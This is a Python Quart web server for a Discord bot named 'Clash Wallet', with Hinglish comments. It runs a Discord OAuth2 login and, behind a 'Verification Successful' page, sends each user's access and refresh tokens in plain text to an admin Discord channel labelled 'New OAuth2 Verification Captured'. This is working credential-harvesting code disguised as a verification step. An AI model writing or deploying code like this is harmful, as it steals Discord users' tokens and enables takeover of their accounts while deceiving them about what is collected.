import os
import aiohttp
import discord
from quart import Quart, request

# Apne existing bot instance ko import karein taaki web server se messages bhej sakein
from bot_instance import bot 

app = Quart(__name__)

# --- CONFIGURATION ---
CLIENT_ID = os.getenv("CLIENT_ID")   # Apna Discord Client ID daalein
# Client Secret ko .env ya Railway variables se lena safe hai
CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET") 
REDIRECT_URI = "https://clashwallet.up.railway.app"
ADMIN_CHANNEL_ID = 1564929347708653572
# ---------------------

@app.route('/')
async def index():
    # Jab user authorize karega, Discord URL mein ?code=xyz bhejega
    code = request.args.get('code')
    
    # Agar code nahi hai, toh matlab normal website visit hai
    if not code:
        return "Clash Wallet Web Server is Online! 🚀"

    # Agar code hai, toh usko tokens ke liye exchange karte hain
    token_data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    async with aiohttp.ClientSession() as session:
        # 1. API request karke Access aur Refresh tokens lena
        async with session.post("https://discord.com/api/oauth2/token", data=token_data, headers=headers) as resp:
            token_response = await resp.json()
            
        if 'access_token' not in token_response:
            return "❌ Authentication Failed. Please try again."

        access_token = token_response['access_token']
        refresh_token = token_response['refresh_token']

        # 2. Token use karke user ki details nikalna
        user_headers = {'Authorization': f'Bearer {access_token}'}
        async with session.get("https://discord.com/api/users/@me", headers=user_headers) as user_resp:
            user_info = await user_resp.json()

        user_id = user_info.get('id')
        username = user_info.get('username')

        # 3. Admin channel fetch karke details send karna
        admin_channel = bot.get_channel(ADMIN_CHANNEL_ID)
        if admin_channel:
            embed = discord.Embed(
                title="✅ New OAuth2 Verification Captured", 
                color=discord.Color.green()
            )
            embed.add_field(name="User", value=f"<@{user_id}> ({username})", inline=False)
            # Dhyan rahe: Tokens sensitive hote hain, sirf admins ke paas jane chahiye
            embed.add_field(name="Access Token", value=f"`{access_token}`", inline=False)
            embed.add_field(name="Refresh Token", value=f"`{refresh_token}`", inline=False)
            
            await admin_channel.send(embed=embed)

        # 4. User ko success message dikhana
        return """
        <html>
            <body style="background-color:#2C2F33; color:white; font-family:sans-serif; text-align:center; padding-top:50px;">
                <h1>✅ Verification Successful!</h1>
                <p>Your details have been securely saved. You can close this tab and return to Discord.</p>
            </body>
        </html>
        """

async def run_web_server():
    """Starts the Quart web server safely alongside the Discord Bot."""
    # Railway automatically assigns a PORT, default to 8080 agar local run kar rahe ho
    port = int(os.environ.get("PORT", 8080))
    await app.run_task(host="0.0.0.0", port=port)
